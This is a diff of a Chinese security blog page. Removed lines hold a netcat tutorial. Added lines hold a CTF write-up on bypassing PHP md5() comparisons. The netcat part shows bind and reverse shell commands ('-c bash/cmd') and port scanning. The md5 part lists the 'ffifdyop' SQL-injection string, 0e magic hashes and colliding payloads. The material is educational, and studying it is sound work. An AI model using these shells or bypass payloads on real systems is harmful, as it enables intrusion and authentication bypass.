@@ -81,30 +81,17 @@
 
 
 
-<meta name="description" content="一.简介Nc全名为Netcat，网络工具中的瑞士军刀。主要功能为：1.侦听模式&#x2F;传输模式2.telnet&#x2F;获取banner信息3.传输文本信息4.传输文件&#x2F;目录5.加密传输文件6.远程控制&#x2F;木马7.加密所有流量8.流媒体服务器9.远程克隆硬盘123456789101112131415161718-h 查看帮助信息-d 后台模式-g gateway source-routing hop point[">
+<meta name="description" content="一.前言本篇文章记录一下在做ctf题时遇到到的md5()绕过方法。主要分为:1234md5(key,true)；md5()&#x3D;&#x3D;md5()；md5()&#x3D;&#x3D;&#x3D;md5()；(string)key1!&#x3D;&#x3D;(string)key2&amp;&amp;md5(key1)&#x3D;&#x3D;&#x3D;md5(key2)绕过思路。  二">
 <meta property="og:type" content="article">
-<meta property="og:title" content="nc详解">
-<meta property="og:url" content="https://da4er.top/nc%E8%AF%A6%E8%A7%A3.html">
+<meta property="og:title" content="PHP中的md5()函数绕过总结">
+<meta property="og:url" content="https://da4er.top/PHP%E4%B8%AD%E7%9A%84md5-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93.html">
 <meta property="og:site_name" content="Da4er&#39;s Blogs">
-<meta property="og:description" content="一.简介Nc全名为Netcat，网络工具中的瑞士军刀。主要功能为：1.侦听模式&#x2F;传输模式2.telnet&#x2F;获取banner信息3.传输文本信息4.传输文件&#x2F;目录5.加密传输文件6.远程控制&#x2F;木马7.加密所有流量8.流媒体服务器9.远程克隆硬盘123456789101112131415161718-h 查看帮助信息-d 后台模式-g gateway source-routing hop point[">
-<meta property="og:image" content="https://da4er.top/nc%E8%AF%A6%E8%A7%A3/1.png">
-<meta property="og:image" content="https://da4er.top/nc%E8%AF%A6%E8%A7%A3/2.png">
-<meta property="og:image" content="https://da4er.top/nc%E8%AF%A6%E8%A7%A3/3.png">
-<meta property="og:image" content="https://da4er.top/nc%E8%AF%A6%E8%A7%A3/4.png">
-<meta property="og:image" content="https://da4er.top/nc%E8%AF%A6%E8%A7%A3/5.png">
-<meta property="og:image" content="https://da4er.top/nc%E8%AF%A6%E8%A7%A3/6.png">
-<meta property="og:image" content="https://da4er.top/nc%E8%AF%A6%E8%A7%A3/7.png">
-<meta property="og:image" content="https://da4er.top/nc%E8%AF%A6%E8%A7%A3/8.png">
-<meta property="og:image" content="https://da4er.top/nc%E8%AF%A6%E8%A7%A3/9.png">
-<meta property="og:image" content="https://da4er.top/nc%E8%AF%A6%E8%A7%A3/1.png">
-<meta property="og:image" content="https://da4er.top/nc%E8%AF%A6%E8%A7%A3/2.png">
-<meta property="og:image" content="https://da4er.top/nc%E8%AF%A6%E8%A7%A3/3.png">
-<meta property="article:published_time" content="2019-11-21T07:35:03.000Z">
-<meta property="article:modified_time" content="2020-02-07T12:11:32.420Z">
+<meta property="og:description" content="一.前言本篇文章记录一下在做ctf题时遇到到的md5()绕过方法。主要分为:1234md5(key,true)；md5()&#x3D;&#x3D;md5()；md5()&#x3D;&#x3D;&#x3D;md5()；(string)key1!&#x3D;&#x3D;(string)key2&amp;&amp;md5(key1)&#x3D;&#x3D;&#x3D;md5(key2)绕过思路。  二">
+<meta property="article:published_time" content="2020-02-11T11:52:15.000Z">
+<meta property="article:modified_time" content="2020-02-11T11:52:53.312Z">
 <meta property="article:author" content="Da4er&#39;s">
 <meta property="article:tag" content="Da4er">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://da4er.top/nc%E8%AF%A6%E8%A7%A3/1.png">
 
 
 
@@ -134,13 +121,13 @@
 
 
 
-  <link rel="canonical" href="https://da4er.top/nc详解.html"/>
+  <link rel="canonical" href="https://da4er.top/PHP中的md5-函数绕过总结.html"/>
 
 
 
 
 
-  <title>nc详解 | Da4er's Blogs</title>
+  <title>PHP中的md5()函数绕过总结 | Da4er's Blogs</title>
   
 
 
@@ -267,7 +254,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://da4er.top/nc%E8%AF%A6%E8%A7%A3.html">
+    <link itemprop="mainEntityOfPage" href="https://da4er.top/PHP%E4%B8%AD%E7%9A%84md5-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Da4er's">
@@ -284,7 +271,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">nc详解</h2>
+          <h2 class="post-title" itemprop="name headline">PHP中的md5()函数绕过总结</h2>
         
 
         <div class="post-meta">
@@ -296,8 +283,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-21T15:35:03+08:00">
-                2019-11-21
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-11T19:52:15+08:00">
+                2020-02-11
               </time>
             
 
@@ -319,8 +306,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
-                    <span itemprop="name">Web安全&渗透测试</span>
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
                   </a>
                 </span>
 
@@ -336,7 +323,7 @@
 
           
           
-             <span id="/nc%E8%AF%A6%E8%A7%A3.html" class="leancloud_visitors" data-flag-title="nc详解">
+             <span id="/PHP%E4%B8%AD%E7%9A%84md5-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93.html" class="leancloud_visitors" data-flag-title="PHP中的md5()函数绕过总结">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -361,7 +348,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  671
+                  538
                 </span>
               
 
@@ -398,15 +385,13 @@
       
 
       
-        <h2 id="一-简介"><a href="#一-简介" class="headerlink" title="一.简介"></a>一.简介</h2><p>Nc全名为Netcat，网络工具中的瑞士军刀。<br>主要功能为：<br>1.侦听模式/传输模式<br>2.telnet/获取banner信息<br>3.传输文本信息<br>4.传输文件/目录<br>5.加密传输文件<br>6.远程控制/木马<br>7.加密所有流量<br>8.流媒体服务器<br>9.远程克隆硬盘<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-h 查看帮助信息</span><br><span class="line">-d 后台模式</span><br><span class="line">-g gateway source-routing hop point[s], up to 8</span><br><span class="line">-G num source-routing pointer: 4, 8, 12, …</span><br><span class="line">-e prog程序重定向，一但连接就执行［危险］</span><br><span class="line">-i secs延时的间隔</span><br><span class="line">-l 监听模式，用于入站连接</span><br><span class="line">-L 监听模式，连接天闭后仍然继续监听，直到CTR+C</span><br><span class="line">-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)</span><br><span class="line">-o film记录16进制的传输</span><br><span class="line">-p[空格]端口 本地端口号</span><br><span class="line">-s addr 本地源地址</span><br><span class="line">-r 随机本地及远程端口</span><br><span class="line">-t 使用Telnet交互方式</span><br><span class="line">-u UDP模式</span><br><span class="line">-v 详细输出，用-vv将更详细</span><br><span class="line">-w 数字 timeout延时间隔</span><br><span class="line">-z 将输入，输出关掉（用于扫锚时）</span><br></pre></td></tr></table></figure></p>
-<h2 id="二-telnet-获取banner信息"><a href="#二-telnet-获取banner信息" class="headerlink" title="二.telnet/获取banner信息"></a>二.telnet/获取banner信息</h2><p>-n 参数：只接收ip，没有dns解析<br>-v 参数：返回详细信息<br>我们先来解析一下要连接的ip地址：<br><img src="/nc%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image"><br>用nc -nv 连接目标的80端口<br><img src="/nc%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image"></p>
-<h2 id="三-传输文本信息"><a href="#三-传输文本信息" class="headerlink" title="三.传输文本信息"></a>三.传输文本信息</h2><p>-l：设置为监听模式<br>-p：指定一个开放的端口<br>用-l -p参数将目标设置为服务器，并开放一个端口等待连接<br><img src="/nc%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image"><br>我们可以用nc进行聊天：<br><img src="/nc%E8%AF%A6%E8%A7%A3/4.png" class title="This is an test image"></p>
-<h2 id="四-传输文件或目录"><a href="#四-传输文件或目录" class="headerlink" title="四.传输文件或目录"></a>四.传输文件或目录</h2><p>Nc可以当作一个文件传输服务器，传输文件到目标机器。传输可分为正向传输和反向传输。<br>正向传输：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 444&lt;1.py</span><br><span class="line">nc -nv 1.1.1.1 444 &gt;2.py</span><br></pre></td></tr></table></figure><br><img src="/nc%E8%AF%A6%E8%A7%A3/5.png" class title="This is an test image"><br><img src="/nc%E8%AF%A6%E8%A7%A3/6.png" class title="This is an test image"></p>
-<p>反向传输：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 444&gt;1.py</span><br><span class="line">nc -nv 1.1.1.1 444&lt;1.py</span><br></pre></td></tr></table></figure><br><img src="/nc%E8%AF%A6%E8%A7%A3/7.png" class title="This is an test image"><br><img src="/nc%E8%AF%A6%E8%A7%A3/8.png" class title="This is an test image"></p>
-<h2 id="五-Nc端口扫描"><a href="#五-Nc端口扫描" class="headerlink" title="五.Nc端口扫描"></a>五.Nc端口扫描</h2><p>nc -nvz 开启端口扫描 默认扫描tcp端口<br>nc -nvzu 扫描udp端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz 1.1.1.1 1-65535</span><br><span class="line">nc -nvzu 1.1.1.1 1-1024</span><br></pre></td></tr></table></figure><br><img src="/nc%E8%AF%A6%E8%A7%A3/9.png" class title="This is an test image"></p>
-<h2 id="六-远程控制"><a href="#六-远程控制" class="headerlink" title="六.远程控制"></a>六.远程控制</h2><p>正向控制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp port -c bash&#x2F;cmd</span><br><span class="line">nc -nv ip</span><br></pre></td></tr></table></figure><br>意思是服务器开放一个端口，当客户端连接时直接获取shell，这样在客户端就能执行服务器的命令<br><br><img src="/nc%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image"></p>
-<p>反向控制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -ip port</span><br><span class="line">nc -nv ip -c bash&#x2F;cmd</span><br></pre></td></tr></table></figure><br>意思是服务器开放一个端口，当客户端连接时直接将自己的shell给服务器端，在服务器端执行客户端命令<br><img src="/nc%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image"><br><img src="/nc%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image"></p>
-<p>好久没更新了，因为最近一直按专题学习常见的漏洞，也没啥好写的，最近在学习sql注入，等写完了再一块发出来吧~</p>
+        <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
+<h3 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h3><p>本篇文章记录一下在做ctf题时遇到到的md5()绕过方法。主要分为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">md5(key,true)；</span><br><span class="line">md5()&#x3D;&#x3D;md5()；</span><br><span class="line">md5()&#x3D;&#x3D;&#x3D;md5()；</span><br><span class="line">(string)key1!&#x3D;&#x3D;(string)key2&amp;&amp;md5(key1)&#x3D;&#x3D;&#x3D;md5(key2)</span><br></pre></td></tr></table></figure><br>绕过思路。</p>
+<hr>
+<h3 id="二-具体方法"><a href="#二-具体方法" class="headerlink" title="二.具体方法"></a>二.具体方法</h3><h4 id="1-MD5-key-true"><a href="#1-MD5-key-true" class="headerlink" title="1. MD5(key,true)"></a>1. MD5(key,true)</h4><p>默认md5第二个参数是false。<br>FALSE - 默认 32 字符十六进制数<br>TRUE -  原始 16 字符二进制格式<br>所以当我们传入一些特殊字符后会在浏览器中显示一些关键字，从而实现绕过。<br>两个特殊的字符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line">129581926211651571912466741651878684928</span><br><span class="line">ffifdyop：T0Do#&#39;or&#39;8</span><br><span class="line">129581926211651571912466741651878684928：&#39;or&#39;6]!r,b。</span><br></pre></td></tr></table></figure><br>一般传入ffifdyop即可绕过。</p>
+<h4 id="2-md5-md5"><a href="#2-md5-md5" class="headerlink" title="2.md5()==md5()"></a>2.md5()==md5()</h4><p>这个主要用到弱类型比较，以科学计数法0e开头的，在比较时会自动转换成0从而绕过比较。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure><br>以上就是一些常用的绕过参数，随便找两个传进去就可以绕过。</p>
+<h4 id="3-md5-md5"><a href="#3-md5-md5" class="headerlink" title="3.md5()===md5()"></a>3.md5()===md5()</h4><p>===强制类型比较，当比较时会比较类型和大小，所以用第二种绕过不了。<br>但是我们可以用数组绕过，当我们传入不符合规定的参数时：md5([1])==md5([2])==error，即error==error从而绕过。</p>
+<h4 id="4-string-key1-string-key2-amp-amp-md5-key1-md5-key2"><a href="#4-string-key1-string-key2-amp-amp-md5-key1-md5-key2" class="headerlink" title="4.(string)key1!==(string)key2&amp;&amp;md5(key1)===md5(key2)"></a>4.(string)key1!==(string)key2&amp;&amp;md5(key1)===md5(key2)</h4><p>这个在比较时强制类型转换成string类型，所以第三种就不可以了。<br>但是这个要求我们传入md5相同但是字符串不相同的两个参数，其实这样的情况是存在的。<br>两条payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Param1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">Param2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><br>上面的payload就可以绕过，当然还有很多这样的字符串。<br>注意一下的是在post传参时要urlencode一下。</p>
 
       
     </div>
@@ -424,7 +409,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># Web安全&渗透测试</a>
+            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
           
         </div>
       
@@ -437,8 +422,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%9D%E8%AF%95-%E5%AF%B9zvuldrill%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%B8%80.html" rel="next" title="代码审计初试-对zvuldrill漏洞靶场的代码审计(一)">
-                <i class="fa fa-chevron-left"></i> 代码审计初试-对zvuldrill漏洞靶场的代码审计(一)
+              <a href="/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90.html" rel="next" title="文件泄露漏洞解析">
+                <i class="fa fa-chevron-left"></i> 文件泄露漏洞解析
               </a>
             
           </div>
@@ -446,10 +431,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3.html" rel="prev" title="Mysql注入详解">
-                Mysql注入详解 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -633,7 +614,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-简介"><span class="nav-number">1.</span> <span class="nav-text">一.简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二-telnet-获取banner信息"><span class="nav-number">2.</span> <span class="nav-text">二.telnet&#x2F;获取banner信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三-传输文本信息"><span class="nav-number">3.</span> <span class="nav-text">三.传输文本信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四-传输文件或目录"><span class="nav-number">4.</span> <span class="nav-text">四.传输文件或目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五-Nc端口扫描"><span class="nav-number">5.</span> <span class="nav-text">五.Nc端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六-远程控制"><span class="nav-number">6.</span> <span class="nav-text">六.远程控制</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一-前言"><span class="nav-number">1.</span> <span class="nav-text">一.前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二-具体方法"><span class="nav-number">2.</span> <span class="nav-text">二.具体方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-MD5-key-true"><span class="nav-number">2.1.</span> <span class="nav-text">1. MD5(key,true)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-md5-md5"><span class="nav-number">2.2.</span> <span class="nav-text">2.md5()&#x3D;&#x3D;md5()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-md5-md5"><span class="nav-number">2.3.</span> <span class="nav-text">3.md5()&#x3D;&#x3D;&#x3D;md5()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-string-key1-string-key2-amp-amp-md5-key1-md5-key2"><span class="nav-number">2.4.</span> <span class="nav-text">4.(string)key1!&#x3D;&#x3D;(string)key2&amp;&amp;md5(key1)&#x3D;&#x3D;&#x3D;md5(key2)</span></a></li></ol></li></ol></div>
             
 
           </div>
